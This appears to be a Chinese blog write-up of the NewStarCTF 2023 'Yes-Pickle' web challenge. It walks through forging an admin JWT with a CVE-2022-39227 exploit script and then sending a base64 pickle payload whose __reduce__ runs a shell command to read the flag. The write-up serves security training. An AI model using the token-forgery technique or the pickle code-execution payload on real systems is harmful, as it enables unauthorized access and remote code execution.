---
title: "[NewStarCTF-2023-公开赛道]Yes-Pickle"
description: "- 根路由(\"/\")：检查查询参数 token。如果存在，它会验证JWT并在会话中设置用户角色。如果不存在，它会将用户角色设置为\"guest\"，生成一个新的JWT，并将其传递给渲染的index.html模板。 - \"/pickle\"路由：如果会话中的用户角色为\"admin\"，则会对传入的pickle查询参数进行反序列化…"
publishDate: "2025-08-22T01:09:42+08:00"
categories: ["CTF"]
tags: ["newstarctf", "pickle"]
---
下载题目的附件

https://pan.baidu.com/s/1CmfsZI4r7bg6xch36TtTCw?pwd=NNUS 提取码：NNUS

![image-20240327172534776](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/4a266fd9558910b9ecd0afda8b697f5b.png)

分析代码文件

- 根路由("/")：检查查询参数 `token`。如果存在，它会验证JWT并在会话中设置用户角色。如果不存在，它会将用户角色设置为"guest"，生成一个新的JWT，并将其传递给渲染的`index.html`模板。
- "/pickle"路由：如果会话中的用户角色为"admin"，则会对传入的`pickle`查询参数进行反序列化。



所以，先将role置为admin，然后传入pickle进行反序列化。


![image-20240327172353746](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/a70e59ee999d73ccd535a3636fb1eead.png)

打开题目链接

将token进行jwt解码

![image-20240327173433340](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/60e6498dd8fe26837395ae2d966dc70b.png)



此时，role为guest

此处利用CVE-2022-39227漏洞进行JWT身份验证绕过

```python
python cve_2022_39227.py -j eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.S7-Ttiqb3QVDz2476oTJtHebQ7i5gNWm1aWIBND7iaFiGSMBn6S0lReftdTU8w3CVCaHHw-l9P4JFVNsJClPGv9S2JxwVwPXm0DZNPTZx9DJKUoC9wKT6K9Me3BuX48k7cO_cXgPvMDz9LAPCi-6XcT2gX5PEX0M9Nnf-W3Ydhi0fgcqA3MFwTAN-c8n52cAb-JixEm7Tqi2qnjP-3HeEZi2gWXmilJCt_XoK_WQ3Cn3bOhZOGhZcJ0FhvYuVW1330HI26FEAgZuaCxtGXYaWpbO9zzOTxgkyM7-sIYhEXCVbTS4l28QSfuvt8yGehySeCN7S9NCrmJ6qG0I9hqzUQ -i role=admin
```

![image-20240327173852758](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/d2b9c14da3604230e54f3dd8fd26acc6.png)



得到变换之后的token为

```
auth={"  eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6ImFkbWluIiwidXNlcm5hbWUiOiJib29naXBvcCJ9.":"","protected":"eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9", "payload":"eyJleHAiOjE3MTE1MzA0MjEsImlhdCI6MTcxMTUyNjgyMSwianRpIjoiWUpiMTJqckxRN1kxNlVZVjZVUjNnUSIsIm5iZiI6MTcxMTUyNjgyMSwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9","signature":"S7-Ttiqb3QVDz2476oTJtHebQ7i5gNWm1aWIBND7iaFiGSMBn6S0lReftdTU8w3CVCaHHw-l9P4JFVNsJClPGv9S2JxwVwPXm0DZNPTZx9DJKUoC9wKT6K9Me3BuX48k7cO_cXgPvMDz9LAPCi-6XcT2gX5PEX0M9Nnf-W3Ydhi0fgcqA3MFwTAN-c8n52cAb-JixEm7Tqi2qnjP-3HeEZi2gWXmilJCt_XoK_WQ3Cn3bOhZOGhZcJ0FhvYuVW1330HI26FEAgZuaCxtGXYaWpbO9zzOTxgkyM7-sIYhEXCVbTS4l28QSfuvt8yGehySeCN7S9NCrmJ6qG0I9hqzUQ"}
```

![image-20240327174011931](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/6264b7343edcf65c9af09c4c343e4f87.png)

get方式传参，然后抓包

![image-20240327174624574](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/2bd41befb9046c772dab9c0b8b14782f.png)

此时，我们查看网页的cookie信息

![image-20240327174731106](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/99a61cc8316e493f29d07f07fd0b06ca.png)

![image-20240327174806572](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/3d7ba583c874b8908f4478ab73c37cca.png)

已经转化为admin

然后，我们进一步在pickle路由下面反序列化

报错回显

```python
import pickle
import base64

class A():
   def __reduce__(self):
      return (exec,("raise Exception(__import__('os').popen('cat fla*').read())",))


poc = base64.b64encode(pickle.dumps(A()))
print(poc)
```

```
b'gASVVgAAAAAAAACMCGJ1aWx0aW5zlIwEZXhlY5STlIw6cmFpc2UgRXhjZXB0aW9uKF9faW1wb3J0X18oJ29zJykucG9wZW4oJ2NhdCBmbGEqJykucmVhZCgpKZSFlFKULg=='
```

![image-20240327175245956](https://pub-0e9b5be439a54fec9fbbd5bd26cbd38c.r2.dev/2026/07/38a53a605b44833ae4460f36a6d3d259.png)

注意cookie中session的值为

```
eyJyb2xlIjoiYWRtaW4ifQ.ZgPrIg.SG6DW5FYBLmOUM9rMzG7CMNNT-g
```

# 引用

[Newstar Ye's Pickle Python无回显不出网](https://www.yuque.com/zacarx007/civwlr/aiy8ccp6rl68lucf?singleDoc#)

[[NewStarCTF 2023] web题解](https://blog.csdn.net/m0_73512445/article/details/133694293)

